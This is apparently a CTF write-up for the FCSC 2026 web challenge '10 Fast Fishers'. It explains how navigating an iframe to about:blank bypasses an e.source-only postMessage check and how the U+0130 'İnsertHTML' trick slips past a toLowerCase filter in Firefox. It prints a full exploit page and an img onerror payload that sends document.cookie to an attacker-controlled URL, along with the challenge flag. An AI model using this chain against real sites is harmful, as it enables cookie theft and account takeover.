+++
type               = "ctf"
title              = "10 Fast Fishers"
description        = "Abusing cross-origin iframe navigation and Firefox's execCommand Unicode normalization to bypass a postMessage filter"
author             = "conflict"
date               = "2026-04-12"
language           = "en"
tags               = ["web", "web-client", "xss", "iframe", "postmessage"]
event              = "FCSC 2026"
category           = "web"
stars              = 1
solves             = 15
challenge_author   = ["Mizu"]
challenge_author_url = ["https://mizu.re/"]
rating             = 10
flag               = "FCSC{ef387c83c9e558b135d9837c5dc43f46}"
redirect_from      = ["/posts/2026/04/fcsc-2026-10-fast-fishers/"]
references         = ["https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss/postmessage-exploitation", "https://10fastfingers.com/"]
+++

# Introduction

10 Fast Fishers is a 1-star web challenge from FCSC 2026. The application is a typing game: fish swim across an aquarium, each carrying a word and a text formatting command. 

You type a word, click the fish and the corresponding `document.execCommand()` is applied to the selected text in a `contenteditable` editor.

The challenge comes with a bot that visits any *URL* you provide, with a `FLAG` cookie set on the application domain. Sadly, the goal is to steal this cookie and not to actually play the game.

![wdym_meme](https://i.imgflip.com/aoycqo.jpg)

# TLDR

The main game page (`game.js`) accepts *FISH_CLICKED* `postMessages` but only verifies `e.source`, not `e.origin`. By iframing the game page, we can navigate its inner aquarium iframe to `about:blank`, gaining same-origin access to it and allowing us to call `inner.eval()`.

From there we send a message whose `e.source` is the original `aquariumFrame.contentWindow`, bypassing the check. 

The `insertHTML` command is explicitly filtered, but the guard uses `command.toLowerCase()`. Sending `İnsertHTML` (U+0130, Turkish dotted capital I) bypasses the string comparison because JavaScript's `toLowerCase()` does not fold it to `i`, while Firefox's `execCommand` internally normalizes it and executes `insertHTML` anyway.

Chaining both, we inject any arbitrary HTML into the editor, fire an `onerror` handler and exfiltrate the cookie.

# Infrastructure Analysis

## The application

The app is a Node.js/Express server exposing two routes:

- `/`, the main game page, served as `index.html` with `game.js`
- `/aquarium` the fish animation iframe, served as `aquarium.html` with `aquarium.js`

The main page embeds the aquarium as a child iframe:

```html
<iframe id="aquariumFrame" src="/aquarium"></iframe>
```

The two frames communicate exclusively via `postMessage`. When a fish is clicked in the aquarium, it sends a *FISH_CLICKED* message to the parent with a `command` and an optional `value`. The parent calls `document.execCommand(command, false, value)` on the selected text in a `contenteditable` div.

## The bot

The bot is a Puppeteer instance running Firefox headless. On each visit it:

- Sets a `FLAG` cookie on `10-fast-fishers-app` (non-httpOnly)
- Navigates to the attacker-supplied URL
- Waits 5 seconds, then closes

Any `console.log` on the bot is echoed back to the attacker which is useful for debugging.

## Useful observations

- The `FLAG` cookie is not HttpOnly so `document.cookie` can read it.
- The main page is framable, no `X-Frame-Options` or `CSP` headers.
- `game.js` checks `e.source` on incoming messages but not `e.origin`
- `aquarium.js` checks both, but we don't need to target it directly.
- `document.execCommand('insertHTML', ...)` would give us arbitrary HTML injection, but it's filtered in `handleFishClick`

# Hijacking the Trusted iframe

## The weak e.source check

In `game.js`, incoming postMessages are validated like this:

```jsx
window.addEventListener('message', (e) => {
    if (e.source !== aquariumFrame.contentWindow) {
        console.warn('Message rejected: not from iframe');
        return;
    }

    console.log('[message]> Valid message received, processing...');
    const { type, data } = e.data;
    
    if (type === 'IFRAME_READY') {
        iframeReady = true;
        console.log('Iframe is ready');
    } else if (type === 'FISH_CLICKED') {
        handleFishClick(data);
    }
});
```

The check verifies that the message comes from the `aquariumFrame` window object, but never checks `e.origin`. This means that if we can send a message whose `e.source` is `aquariumFrame.contentWindow`, the check passes regardless of where the message actually originates from.

## Navigating the inner frame to about:blank

Since the game page is framable, we load it inside an iframe on our attacker page. That outer iframe contains its own `<iframe id="aquariumFrame" src="/aquarium"></iframe>`, the inner frame we want to hijack.

```jsx
  attacker.com (top)
  └── iframe → 10-fast-fishers-app:5000/ (game.js)
      └── iframe#aquariumFrame → /aquarium (aquarium.js)
```

We get a reference to the inner frame:

```jsx
const inner = iframe.contentWindow.frames[0];
```

Even though `inner` is cross-origin, we can redirect it because assigning `.location` to a cross-origin frame is always permitted by browsers. We navigate it to `about:blank`:

```jsx
inner.location = 'about:blank';
```

![aquarium_meme](https://i.imgflip.com/aoyct4.gif)

After this navigation, `about:blank` is same-origin with the attacker, so `inner.eval()` becomes accessible. 

Critically, the window object itself does not change during a navigation: in `game.js`, `aquariumFrame.contentWindow` still points to the same reference. So any message sent from `inner` will have `e.source == aquariumFrame.contentWindow`, passing the check.

We store the payload on the top window to avoid escaping issues, then fire it from the inner frame:

```jsx
window.msg = { 
    type: 'FISH_CLICKED', 
    data: {
        command: '\u0130nsertHTML',
        value: '<img src=x onerror="location=\'http://localhost:6767/whatever.html?code_exec=\'+document.cookie">',
        points: 10,
        targetWord: 'Shrimp',
        fishId: 0
 }};
inner.eval('parent.postMessage(top.msg, "*")');
```

`parent` from within `inner` is the game page. 

# 10 Fast Fishers, 1 Weird Fish

In `handleFishClick`, the `insertHTML` command is explicitly blocked:

```jsx
function handleFishClick(data) {
    const { command, value, points, targetWord, fishId } = data;
    console.log("[handleFishClick]>", JSON.stringify(data));

    // TODO: Safely implement insertHtml command
    if (command.toLowerCase() === 'inserthtml') {
        return;
    }
[...]
document.execCommand(command, false, value);
}
```

The filter uses JavaScript's `String.prototype.toLowerCase()`. The trick is to send `İnsertHTML` where `İ` is the Latin capital letter I with a dot above (`U+0130`).

In JavaScript, `'İ'.toLowerCase()` does not produce `'i'`. It produces `'i̇'`, therefore:

```jsx
> 'İ'.toLowerCase() == 'i' 
false 
> 'İ'.toLowerCase() 
"i̇" 
> 'İnsertHTML'.toLowerCase() === 'inserthtml' 
false 
```

Once past the filter, `document.execCommand('İnsertHTML', false, payload)` is called. Firefox normalizes command names internally before dispatching them, so it treats `İnsertHTML` as `insertHTML` and executes it. 

# Gone Fishing

This is the exploit page that should be hosted on the attacker server. I added a timeout to let `about:blank` load.

```html
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body>
<iframe id="iframe" src="http://10-fast-fishers-app:5000/"></iframe>
<script>
const iframe = document.getElementById('iframe');
iframe.onload = () => {
  const inner = iframe.contentWindow.frames[0];
  inner.location = 'about:blank';

  setTimeout(() => {
    const msg = {
      type: 'FISH_CLICKED',
      data: {
        command: '\u0130nsertHTML',
        value: '<img src=x onerror="location=\'http://attacker_url/whatever.html?code_exec=\'+document.cookie">',
        points: 10,
        targetWord: 'Shrimp',
        fishId: 0
      }
    };

    // Store message on top so the inner frame can read it without escaping issues
    window.msg = msg;
    inner.eval('parent.postMessage(top.msg, "*")');
  }, 1000);
};
</script>
</body>
</html>
```

The `<img>` tag is injected into the `contenteditable` editor via `insertHTML`. Its `onerror` handler fires immediately, reading `document.cookie` and exfiltrating the flag to the attacker's server.

```html
GET /?c=FLAG=FCSC{ef387c83c9e558b135d9837c5dc43f46}
```

# Conclusion

This was a very fun challenge made by Mizu, as a monkeytype tryhard I had to solve it and make a writeup about it. I also loved the lore and the details such as the aquarium that's actually a different frame, like it's separated from the main page.

![me_playing_meme](https://i.imgflip.com/aoycmo.gif)
